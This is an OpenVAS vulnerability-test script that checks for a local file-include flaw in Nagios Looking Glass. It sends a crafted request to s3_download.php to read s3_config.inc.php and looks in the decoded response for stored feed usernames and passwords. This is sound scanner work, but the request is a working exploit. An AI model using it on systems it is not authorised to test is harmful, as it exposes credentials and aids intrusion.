###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_nagios_lg_63381.nasl 3911 2016-08-30 13:08:37Z mime $
#
# Nagios Looking Glass Local File Include Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2013 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103845";
CPE = "cpe:/a:nagios:nagios";

tag_insight = "The application fails to adequately validate user-supplied input.";

tag_impact = "An attacker can exploit this issue to obtain potentially sensitive
information and execute arbitrary local scripts in the context of the
Web server process. This may aid in further attacks.";

tag_affected = "Nagios Looking Glass 1.1.0 beta 2 and prior are vulnerable.";
tag_summary = "Nagios Looking Glass is prone to a local file-include vulnerability";
tag_solution = "Ask the Vendor for an update.";
tag_vuldetect = "Try to read the s3_config.inc.php via HTTP GET request.";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(63381);
 script_version ("$Revision: 3911 $");
 script_tag(name:"cvss_base", value:"6.4");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:N");

 script_name("Nagios Looking Glass Local File Include Vulnerability");


 script_xref(name:"URL", value:"http://www.securityfocus.com/bid/63381");
 script_xref(name:"URL", value:"http://www.nagios.org/");
 
 script_tag(name:"last_modification", value:"$Date: 2016-08-30 15:08:37 +0200 (Tue, 30 Aug 2016) $");
 script_tag(name:"creation_date", value:"2013-12-03 10:16:11 +0100 (Tue, 03 Dec 2013)");
 script_summary("Determine if it is possible to read s3_config.inc.php");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2013 Greenbone Networks GmbH");
 script_dependencies("nagios_detect.nasl");
 script_require_ports("Services/www", 80);
 script_mandatory_keys("nagios/installed");

 script_tag(name : "impact" , value : tag_impact);
 script_tag(name : "vuldetect" , value : tag_vuldetect);
 script_tag(name : "insight" , value : tag_insight);
 script_tag(name : "solution" , value : tag_solution);
 script_tag(name : "summary" , value : tag_summary);
 script_tag(name : "affected" , value : tag_affected);

 exit(0);
}

include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("misc_func.inc"); 

if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);
if(!get_port_state(port))exit(0);

dirs = make_list("/nspl_status","/nlg", cgi_dirs());

if(app_dir = get_app_location(cpe:CPE, nvt_SCRIPT_OID, port:port)) {
 dirs = make_list(app_dir, dirs);
} 

foreach dir (dirs) {

  url = dir + '/server/s3_download.php';

  if(http_vuln_check(port:port, url:url,pattern:'No filename given')) {

    url = dir + '/server/s3_download.php?filename=s3_config.inc.php&action=update';
    req = http_get(item:url, port:port);
    buf = http_send_recv(port:port, data:req, bodyonly:FALSE);

    if(buf !~ "HTTP/1.1 200")exit(99);

    buf = base64_decode(str:buf);

    if("ServerFeed_AuthUsername" >< buf || "ServerFeed_AuthPassword" >< buf || "configuration file for Network Looking Glass" >< buf) {
      report = 'It was possible to read the base64 encoded s3_config.inc.php by requesting:\n\n' + url + '\n';
      security_message(port:port, data:report);
      exit(0);
    }  

  }  

}  

exit(99);
